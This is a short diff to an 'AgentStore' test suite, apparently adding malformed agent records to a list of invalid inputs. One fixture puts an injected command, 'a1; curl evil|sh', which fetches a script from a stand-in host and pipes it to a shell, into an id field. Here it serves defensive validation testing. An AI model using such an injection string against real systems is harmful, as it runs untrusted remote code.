@@ -52,6 +52,8 @@ describe('AgentStore', () => {
         MORTIS,
         { ...MORTIS, name: '' },
         { ...MORTIS, permissionMode: 'x' },
+        { ...MORTIS, id: 'a1; curl evil|sh' },
+        { ...MORTIS, id: 42 },
         null,
         3,
       ]),
